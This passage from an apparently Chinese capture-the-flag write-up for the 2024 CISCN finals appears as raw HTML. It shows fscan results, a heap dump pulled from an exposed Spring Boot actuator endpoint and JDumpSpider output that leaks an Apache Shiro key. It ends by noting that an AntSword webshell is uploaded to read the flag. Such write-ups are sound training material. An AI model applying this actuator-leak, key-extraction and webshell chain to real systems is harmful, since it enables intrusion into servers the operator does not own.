class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>                     fscan version: <span class="token number">1.8</span>.3start infoscan<span class="token number">8.130</span>.44.201:8080 <span class="token function">open</span><span class="token number">8.130</span>.44.201:22 <span class="token function">open</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: <span class="token number">2</span>start vulscan<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://8.130.44.201:8080  code:302 len:0      title:None 跳转url: http://8.130.44.201:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>65B247F806C408534985A1D9591BE5BE<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://8.130.44.201:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>65B247F806C408534985A1D9591BE5BE code:200 len:1383   title:Master ERP login Form<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://8.130.44.201:8080 poc-yaml-spring-actuator-heapdump-file<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://8.130.44.201:8080 poc-yaml-springboot-env-unauth spring2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ERP"><a href="#ERP" class="headerlink" title="ERP"></a>ERP</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://8.130.44.201:8080  code:302 len:0      title:None 跳转url: http://8.130.44.201:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>65B247F806C408534985A1D9591BE5BE<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://8.130.44.201:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>65B247F806C408534985A1D9591BE5BE code:200 len:1383   title:Master ERP login Form<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://8.130.44.201:8080 poc-yaml-spring-actuator-heapdump-file<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://8.130.44.201:8080 poc-yaml-springboot-env-unauth spring2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>存在敏感信息泄露，访问<code>/actuator/env</code>可以读到配置信息</p><p><code>/actuator/heapdump</code>可以导出堆内存信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">java</span> <span class="token parameter variable">-jar</span> JDumpSpider-1.1-SNAPSHOT-full.jar heapdumpLoading heap dump heapdump from cache failed.java.io.IOException: HPROF <span class="token function">time</span> mismatch. Cached <span class="token number">1698502789924</span> from heap dump <span class="token number">1721521747178</span>        at org.graalvm.visualvm.lib.jfluid.heap.HprofHeap.<span class="token operator">&lt;</span>init<span class="token operator">></span><span class="token punctuation">(</span>HprofHeap.java:385<span class="token punctuation">)</span>        at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.loadHeap<span class="token punctuation">(</span>HeapFactory.java:96<span class="token punctuation">)</span>        at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.createHeap<span class="token punctuation">(</span>HeapFactory.java:79<span class="token punctuation">)</span>        at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.createHeap<span class="token punctuation">(</span>HeapFactory.java:55<span class="token punctuation">)</span>        at org.graalvm.visualvm.lib.jfluid.heap.GraalvmHeapHolder.<span class="token operator">&lt;</span>init<span class="token operator">></span><span class="token punctuation">(</span>GraalvmHeapHolder.java:18<span class="token punctuation">)</span>        at cn.wanghw.Main.call<span class="token punctuation">(</span>Main.java:66<span class="token punctuation">)</span>        at cn.wanghw.Main.main<span class="token punctuation">(</span>Main.java:29<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>SpringDataSourceProperties-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>WeblogicDataSourceConnectionPoolConfig-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>MongoClient-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>AliDruidDataSourceWrapper-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>HikariDataSource-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>RedisStandaloneConfiguration-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>JedisClient-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>CookieRememberMeManager<span class="token punctuation">(</span>ShiroKey<span class="token punctuation">)</span>-------------algMode <span class="token operator">=</span> GCM, key <span class="token operator">=</span> 0f+dthGML0M572/nBElv8g<span class="token operator">==</span>, algName <span class="token operator">=</span> AES<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>OriginTrackedMapPropertySource-------------management.endpoints.web.exposure.include <span class="token operator">=</span> *spring.thymeleaf.encoding <span class="token operator">=</span> UTF-8management.endpoint.health.show-details <span class="token operator">=</span> alwaysspring.thymeleaf.cache <span class="token operator">=</span> <span class="token boolean">true</span>spring.thymeleaf.content-type <span class="token operator">=</span> text/htmlserver.port <span class="token operator">=</span> <span class="token number">8080</span>spring.thymeleaf.check-template <span class="token operator">=</span> <span class="token boolean">true</span>management.endpoints.jmx.exposure.include <span class="token operator">=</span> *<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>MutablePropertySources-------------awt.toolkit <span class="token operator">=</span> sun.awt.X11.XToolkitsun.boot.class.path <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classesjava.protocol.handler.pkgs <span class="token operator">=</span> org.springframework.boot.loadersun.management.compiler <span class="token operator">=</span> HotSpot <span class="token number">64</span>-Bit Tiered Compilerssun.cpu.isalist <span class="token operator">=</span>sun.jnu.encoding <span class="token operator">=</span> UTF-8java.runtime.version <span class="token operator">=</span> <span class="token number">1.8</span>.0_412-8u412-ga-1~20.04.1-b08java.class.path <span class="token operator">=</span> /opt/erp/ERPProject-0.0.1-SNAPSHOT.jarpath.separator <span class="token operator">=</span> <span class="token builtin class-name">:</span>java.vm.vendor <span class="token operator">=</span> Private Buildos.version <span class="token operator">=</span> <span class="token number">5.4</span>.0-187-genericjava.endorsed.dirs <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsedjava.runtime.name <span class="token operator">=</span> OpenJDK Runtime Environmentfile.encoding <span class="token operator">=</span> UTF-8catalina.useNaming <span class="token operator">=</span> <span class="token boolean">false</span>spring.beaninfo.ignore <span class="token operator">=</span> <span class="token boolean">true</span>java.vm.specification.version <span class="token operator">=</span> <span class="token number">1.8</span>os.name <span class="token operator">=</span> Linuxjava.vm.name <span class="token operator">=</span> OpenJDK <span class="token number">64</span>-Bit Server VMlocal.server.port <span class="token operator">=</span> nulluser.country <span class="token operator">=</span> USjava.vendor.url.bug <span class="token operator">=</span> http://bugreport.sun.com/bugreport/sun.java.command <span class="token operator">=</span> /opt/erp/ERPProject-0.0.1-SNAPSHOT.jarjava.io.tmpdir <span class="token operator">=</span> /tmpcatalina.home <span class="token operator">=</span> /tmp/tomcat.8080.4070673021461777528java.version <span class="token operator">=</span> <span class="token number">1.8</span>.0_412user.home <span class="token operator">=</span> /rootuser.language <span class="token operator">=</span> enPID <span class="token operator">=</span> <span class="token number">589</span>java.awt.printerjob <span class="token operator">=</span> sun.print.PSPrinterJobCONSOLE_LOG_CHARSET <span class="token operator">=</span> UTF-8file.separator <span class="token operator">=</span> /catalina.base <span class="token operator">=</span> /tmp/tomcat.8080.4070673021461777528java.vm.info <span class="token operator">=</span> mixed modejava.specification.name <span class="token operator">=</span> Java Platform API Specificationjava.vm.specification.vendor <span class="token operator">=</span> Oracle CorporationFILE_LOG_CHARSET <span class="token operator">=</span> UTF-8java.awt.graphicsenv <span class="token operator">=</span> sun.awt.X11GraphicsEnvironmentjava.awt.headless <span class="token operator">=</span> <span class="token boolean">true</span>sun.io.unicode.encoding <span class="token operator">=</span> UnicodeLittlejava.ext.dirs <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>MapPropertySources-------------local.server.port <span class="token operator">=</span> null<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>ConsulPropertySources-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>JavaProperties-------------java.util.logging.FileHandler.pattern <span class="token operator">=</span> %h/java%u.logawt.toolkit <span class="token operator">=</span> sun.awt.X11.XToolkitsun.cpu.isalist <span class="token operator">=</span>sun.jnu.encoding <span class="token operator">=</span> UTF-8java.class.path <span class="token operator">=</span> /opt/erp/ERPProject-0.0.1-SNAPSHOT.jarjdk.security.legacyAlgorithms <span class="token operator">=</span> SHA1, RSA keySize <span class="token operator">&lt;</span> <span class="token number">2048</span>, DSA keySize <span class="token operator">&lt;</span> <span class="token number">2048</span>java.vm.vendor <span class="token operator">=</span> Private Buildjdk.disabled.namedCurves <span class="token operator">=</span> secp112r1, secp112r2, secp128r1, secp128r2, secp160k1, secp160r1, secp160r2, secp192k1, secp192r1, secp224k1, secp224r1, secp256k1, sect113r1, sect113r2, sect131r1, sect131r2, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1, X9.62 c2tnb191v1, X9.62 c2tnb191v2, X9.62 c2tnb191v3, X9.62 c2tnb239v1, X9.62 c2tnb239v2, X9.62 c2tnb239v3, X9.62 c2tnb359v1, X9.62 c2tnb431r1, X9.62 prime192v2, X9.62 prime192v3, X9.62 prime239v1, X9.62 prime239v2, X9.62 prime239v3, brainpoolP256r1, brainpoolP320r1, brainpoolP384r1, brainpoolP512r1crypto.policy <span class="token operator">=</span> unlimitedjceks.key.serialFilter <span class="token operator">=</span> java.lang.Enum<span class="token punctuation">;</span>java.security.KeyRep<span class="token punctuation">;</span>java.security.KeyRep<span class="token variable">$Type</span><span class="token punctuation">;</span>javax.crypto.spec.SecretKeySpec<span class="token punctuation">;</span><span class="token operator">!</span>*sun.arch.data.model <span class="token operator">=</span> <span class="token number">64</span>login.configuration.provider <span class="token operator">=</span> sun.security.provider.ConfigFilecatalina.useNaming <span class="token operator">=</span> <span class="token boolean">false</span>user.timezone <span class="token operator">=</span>security.overridePropertiesFile <span class="token operator">=</span> <span class="token boolean">true</span>java.vm.specification.version <span class="token operator">=</span> <span class="token number">1.8</span>os.name <span class="token operator">=</span> Linuxuser.country <span class="token operator">=</span> USsecurity.provider.7 <span class="token operator">=</span> com.sun.security.sasl.Providersun.boot.library.path <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64sun.java.command <span class="token operator">=</span> /opt/erp/ERPProject-0.0.1-SNAPSHOT.jarsecurity.provider.9 <span class="token operator">=</span> sun.security.smartcardio.SunPCSCjdk.security.caDistrustPolicies <span class="token operator">=</span> SYMANTEC_TLSsun.cpu.endian <span class="token operator">=</span> littleuser.home <span class="token operator">=</span> /rootuser.language <span class="token operator">=</span> enjava.specification.vendor <span class="token operator">=</span> Oracle Corporationen <span class="token operator">=</span> UTF-8security.provider.1 <span class="token operator">=</span> sun.security.provider.Sunsecurity.provider.2 <span class="token operator">=</span> sun.security.rsa.SunRsaSignsecurity.provider.3 <span class="token operator">=</span> sun.security.ec.SunECnetworkaddress.cache.negative.ttl <span class="token operator">=</span> <span class="token number">10</span>jdk.tls.alpnCharset <span class="token operator">=</span> ISO_8859_1security.provider.4 <span class="token operator">=</span> com.sun.net.ssl.internal.ssl.Providersecurity.provider.5 <span class="token operator">=</span> com.sun.crypto.provider.SunJCEsecurity.provider.6 <span class="token operator">=</span> sun.security.jgss.SunProviderssl.KeyManagerFactory.algorithm <span class="token operator">=</span> SunX509file.separator <span class="token operator">=</span> /java.specification.name <span class="token operator">=</span> Java Platform API Specificationjava.vm.specification.vendor <span class="token operator">=</span> Oracle CorporationFILE_LOG_CHARSET <span class="token operator">=</span> UTF-8.level <span class="token operator">=</span> INFOjava.awt.graphicsenv <span class="token operator">=</span> sun.awt.X11GraphicsEnvironmentja <span class="token operator">=</span> UTF-8java.awt.headless <span class="token operator">=</span> <span class="token boolean">true</span>com.xyz.foo.level <span class="token operator">=</span> SEVEREpackage.definition <span class="token operator">=</span> sun.,com.sun.xml.internal.,com.sun.imageio.,com.sun.istack.internal.,com.sun.jmx.,com.sun.media.sound.,com.sun.naming.internal.,com.sun.proxy.,com.sun.corba.se.,com.sun.org.apache.bcel.internal.,com.sun.org.apache.regexp.internal.,com.sun.org.apache.xerces.internal.,com.sun.org.apache.xpath.internal.,com.sun.org.apache.xalan.internal.extensions.,com.sun.org.apache.xalan.internal.lib.,com.sun.org.apache.xalan.internal.res.,com.sun.org.apache.xalan.internal.templates.,com.sun.org.apache.xalan.internal.utils.,com.sun.org.apache.xalan.internal.xslt.,com.sun.org.apache.xalan.internal.xsltc.cmdline.,com.sun.org.apache.xalan.internal.xsltc.compiler.,com.sun.org.apache.xalan.internal.xsltc.trax.,com.sun.org.apache.xalan.internal.xsltc.util.,com.sun.org.apache.xml.internal.res.,com.sun.org.apache.xml.internal.resolver.helpers.,com.sun.org.apache.xml.internal.resolver.readers.,com.sun.org.apache.xml.internal.security.,com.sun.org.apache.xml.internal.serializer.utils.,com.sun.org.apache.xml.internal.utils.,com.sun.org.glassfish.,com.oracle.xmlns.internal.,com.oracle.webservices.internal.,oracle.jrockit.jfr.,org.jcp.xml.dsig.internal.,jdk.internal.,jdk.nashorn.internal.,jdk.nashorn.tools.,jdk.xml.internal.,com.sun.activation.registries.,jdk.jfr.events.,jdk.jfr.internal.,jdk.management.jfr.internal.sun.boot.class.path <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classesjava.protocol.handler.pkgs <span class="token operator">=</span> org.springframework.boot.loadersun.management.compiler <span class="token operator">=</span> HotSpot <span class="token number">64</span>-Bit Tiered Compilersjava.runtime.version <span class="token operator">=</span> <span class="token number">1.8</span>.0_412-8u412-ga-1~20.04.1-b08policy.provider <span class="token operator">=</span> sun.security.provider.PolicyFileuser.name <span class="token operator">=</span> rootpolicy.url.1 <span class="token operator">=</span> file:<span class="token variable">$&#123;java.home&#125;</span>/lib/security/java.policypath.separator <span class="token operator">=</span> <span class="token builtin class-name">:</span>fr <span class="token operator">=</span> UTF-8securerandom.source <span class="token operator">=</span> file:/dev/randompolicy.url.2 <span class="token operator">=</span> file:<span class="token variable">$&#123;user.home&#125;</span>/.java.policyjdk.tls.disabledAlgorithms <span class="token operator">=</span> SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize <span class="token operator">&lt;</span> <span class="token number">1024</span>, EC keySize <span class="token operator">&lt;</span> <span class="token number">224</span>, 3DES_EDE_CBC, anon, NULL, include jdk.disabled.namedCurvesos.version <span class="token operator">=</span> <span class="token number">5.4</span>.0-187-genericjava.endorsed.dirs <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsedpolicy.ignoreIdentityScope <span class="token operator">=</span> <span class="token boolean">false</span>java.runtime.name <span class="token operator">=</span> OpenJDK Runtime Environmentkeystore.type.compat <span class="token operator">=</span> <span class="token boolean">true</span>file.encoding <span class="token operator">=</span> UTF-8spring.beaninfo.ignore <span class="token operator">=</span> <span class="token boolean">true</span>java.util.logging.ConsoleHandler.formatter <span class="token operator">=</span> java.util.logging.SimpleFormatterjava.vm.name <span class="token operator">=</span> OpenJDK <span class="token number">64</span>-Bit Server VMjdk.sasl.disabledMechanisms <span class="token operator">=</span>java.vendor.url.bug <span class="token operator">=</span> http://bugreport.sun.com/bugreport/java.io.tmpdir <span class="token operator">=</span> /tmpjava.util.logging.FileHandler.formatter <span class="token operator">=</span> java.util.logging.XMLFormatterjava.util.logging.FileHandler.count <span class="token operator">=</span> <span class="token number">1</span>catalina.home <span class="token operator">=</span> /tmp/tomcat.8080.4070673021461777528sun.cds.enableSharedLookupCache <span class="token operator">=</span> <span class="token boolean">false</span>java.version <span class="token operator">=</span> <span class="token number">1.8</span>.0_412sun.security.krb5.maxReferrals <span class="token operator">=</span> <span class="token number">5</span>jdk.tls.keyLimits <span class="token operator">=</span> AES/GCM/NoPadding KeyUpdate <span class="token number">2</span>^37java.vm.specification.name <span class="token operator">=</span> Java Virtual Machine SpecificationPID <span class="token operator">=</span> <span class="token number">589</span>java.awt.printerjob <span class="token operator">=</span> sun.print.PSPrinterJobCONSOLE_LOG_CHARSET <span class="token operator">=</span> UTF-8jdk.xml.dsig.secureValidationPolicy <span class="token operator">=</span> disallowAlg http://www.w3.org/TR/1999/REC-xslt-19991116,disallowAlg http://www.w3.org/2001/04/xmldsig-more<span class="token comment">#rsa-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#hmac-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#md5,maxTransforms 5,maxReferences 30,disallowReferenceUriSchemes file http https,minKeySize RSA 1024,minKeySize DSA 1024,minKeySize EC 224,noDuplicateIds,noRetrievalMethodLoops</span>catalina.base <span class="token operator">=</span> /tmp/tomcat.8080.4070673021461777528java.library.path <span class="token operator">=</span> /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/libjava.util.logging.FileHandler.limit <span class="token operator">=</span> <span class="token number">50000</span>java.vendor <span class="token operator">=</span> Private Buildjava.vm.info <span class="token operator">=</span> mixed modekeystore.type <span class="token operator">=</span> jksjava.specification.maintenance.version <span class="token operator">=</span> <span class="token number">5</span>handlers <span class="token operator">=</span> java.util.logging.ConsoleHandlerjava.ext.dirs <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/extsun.io.unicode.encoding <span class="token operator">=</span> UnicodeLittlepolicy.expandProperties <span class="token operator">=</span> <span class="token boolean">true</span>securerandom.strongAlgorithms <span class="token operator">=</span> NativePRNGBlocking:SUNkrb5.kdc.bad.policy <span class="token operator">=</span> tryLast<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>ProcessEnvironment-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>OSS-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>UserPassSearcher-------------org.apache.shiro.web.filter.authc.FormAuthenticationFilter:<span class="token punctuation">[</span>failureKeyAttribute <span class="token operator">=</span> shiroLoginFailure, loginUrl <span class="token operator">=</span> /login, successUrl <span class="token operator">=</span> /, usernameParam <span class="token operator">=</span> username, passwordParam <span class="token operator">=</span> password<span class="token punctuation">]</span>org.apache.catalina.startup.Tomcat:<span class="token punctuation">[</span>hostname <span class="token operator">=</span> localhost<span class="token punctuation">]</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以在里面找到shiro密钥</p><p><code>algMode = GCM, key = 0f+dthGML0M572/nBElv8g==, algName = AES</code></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721084057165.png" alt="image-20240721084057165"></p><p>然后上蚁剑马即可，flag在根目录下</p><p><img 